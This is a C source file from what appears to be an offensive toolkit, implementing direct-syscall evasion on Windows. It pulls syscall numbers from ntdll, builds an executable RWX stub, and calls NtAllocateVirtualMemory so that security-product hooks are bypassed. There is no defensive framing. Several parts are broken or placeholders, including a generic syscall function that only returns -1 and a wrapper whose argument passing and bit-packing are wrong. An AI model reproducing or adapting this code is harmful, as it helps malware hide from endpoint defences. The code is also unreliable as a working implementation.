/*
 * Evasion: Direct Syscalls
 *
 * Executes system calls directly without going through ntdll hooks.
 * Windows only.
 */

#ifdef _WIN32

#include "jocky_rt.h"
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

/* ============================================================================
 * Syscall Number Extraction
 * ============================================================================ */

uint32_t jocky_get_syscall_number(const char* zw_name)
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0xFFFFFFFF;

    FARPROC proc = GetProcAddress(hNtdll, zw_name);
    if (!proc) return 0xFFFFFFFF;

    BYTE* func = (BYTE*)proc;

    /* Check for mov eax, imm32 pattern (Windows 10/11) */
    if (func[0] == 0x4C && func[1] == 0x8B && func[2] == 0xD1) {
        /* mov r10, rcx */
        if (func[3] == 0xB8) {
            /* mov eax, syscall_number */
            return *(uint32_t*)(func + 4);
        }
    }

    /* Check for direct syscall number in older patterns */
    if (func[0] == 0xB8) {
        return *(uint32_t*)(func + 1);
    }

    return 0xFFFFFFFF;
}

/* ============================================================================
 * Direct Syscall Stub
 * ============================================================================ */

/*
 * We use a small assembly stub. In real code this would be generated
 * dynamically or use Hell's Gate. For SIH, we provide a generic syscall
 * executor that takes the syscall number and up to 4 arguments.
 */

typedef NTSTATUS (NTAPI* SyscallStub4)(uint32_t num,
                                       uintptr_t a1, uintptr_t a2,
                                       uintptr_t a3, uintptr_t a4);

/* x64 direct syscall stub (mov r10,rcx; mov eax,num; syscall; ret) */
static const unsigned char syscall_stub_template[] = {
    0x4C, 0x8B, 0xD1,             /* mov r10, rcx          */
    0xB8, 0x00, 0x00, 0x00, 0x00, /* mov eax, syscall_num  */
    0x0F, 0x05,                   /* syscall               */
    0xC3                          /* ret                   */
};

#define SYSCALL_STUB_SIZE sizeof(syscall_stub_template)

static SyscallStub4 allocate_syscall_stub(uint32_t syscall_number)
{
    void* mem = VirtualAlloc(NULL, SYSCALL_STUB_SIZE,
                             MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return NULL;

    memcpy(mem, syscall_stub_template, SYSCALL_STUB_SIZE);
    *(uint32_t*)((BYTE*)mem + 4) = syscall_number;

    return (SyscallStub4)mem;
}

intptr_t jocky_direct_syscall(uint32_t syscall_number, ...)
{
    /* We only support up to 4 args for simplicity */
    /* In production you'd use variadic macros or inline asm */
    (void)syscall_number;
    return -1; /* Placeholder: real implementation needs inline asm or stub */
}

/* ============================================================================
 * Convenience Wrappers
 * ============================================================================ */

NTSTATUS jocky_direct_ntallocatevirtualmemory(HANDLE process, PVOID* base,
                                              ULONG_PTR zero_bits,
                                              PSIZE_T size, ULONG type,
                                              ULONG protect)
{
    uint32_t num = jocky_get_syscall_number("NtAllocateVirtualMemory");
    if (num == 0xFFFFFFFF) return STATUS_NOT_IMPLEMENTED;

    SyscallStub4 stub = allocate_syscall_stub(num);
    if (!stub) return STATUS_NO_MEMORY;

    NTSTATUS status = stub(num, (uintptr_t)process, (uintptr_t)base,
                           (uintptr_t)size, (uintptr_t)(type | (protect << 32)));
    /* Note: this is a simplified call pattern. Real code needs proper
     * register setup for all 6 args of NtAllocateVirtualMemory. */

    VirtualFree(stub, 0, MEM_RELEASE);
    return status;
}

#endif /* _WIN32 */
